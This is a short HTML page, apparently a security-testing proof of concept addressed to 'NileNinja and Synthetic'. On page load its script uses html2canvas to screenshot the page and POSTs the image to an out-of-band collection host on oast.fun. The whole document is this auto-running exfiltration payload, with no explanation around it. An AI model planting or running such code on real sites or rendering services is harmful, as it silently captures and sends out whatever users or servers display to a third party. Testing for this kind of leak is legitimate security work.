<!DOCTYPE html>
<html>
<head>
  <title>Screenshot Self</title>
</head>
<body>
  <h1>Hello NileNinja and Synthetic</h1>
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
window.onload = () => {
  html2canvas(document.body).then(canvas => {
    const img = canvas.toDataURL('image/png');
    fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ screenshot: img })
    });
  });
};
</script>
</body>
</html>
